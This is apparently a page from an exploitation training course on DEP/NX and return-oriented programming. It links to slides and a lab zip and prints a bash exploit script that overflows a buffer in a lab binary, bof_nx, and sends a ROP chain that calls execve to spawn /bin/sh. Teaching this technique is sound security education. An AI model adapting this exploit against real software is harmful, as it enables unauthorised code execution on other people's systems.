=====================
Day 2 - 3 DEP NX ROP
=====================

Below is the PowerPoint for this section.

:download:`DEP NX ROP PowerPoint<media/day2/dep_nx_rop.pptx>` 

Activities
----------

Here you can find the PowerPoint for the activities portion, as 
well as corresponding files.

:download:`Bypassing NX with ROP PowerPoint<media/day2/bypassing_nx_with_rop.pptx>` 

:download:`bof NX zip<media/day2/bof_nx.zip>`

::

    #exploit.sh 
    #!/bin/bash
    
    # Exploit for /usr/local/bin/bof_nx
    # Uses ROP to defeat NX


    # Fill buffer and extra space...

    echo -en "AAAAAAAAAAAAAAAA"             # Fill 16-byte buffer
    echo -en "BBBBBBBB"                             # Fill extra space added by GCC
    echo -en "CCCC"                                 # Fill saved EBP


    # execv("/bin/sh", NULL); direct ROP shellcode...

    echo -en "\x2f\x85\x04\x08"             # pop eax; ret;
    echo -en "\x0b\x00\x00\x00"             # 11 (SYS_execv)
    echo -en "\x31\x85\x04\x08"             # pop ebx; ret;
    echo -en "\x1c\xa0\x04\x08"             # char* -> "/bin/sh"
    echo -en "\x55\x85\x04\x08"             # xor ecx, ecx; ret;
    echo -en "\x4a\x84\x04\x08"             # int 0x80; ret

    echo ""                                                 # newline (\n), send it!


    # Linux wants to send EOF to the shell, closing it early.
    # Use `cat` here to continue reading/sending input after
    # the shell pops.

    cat
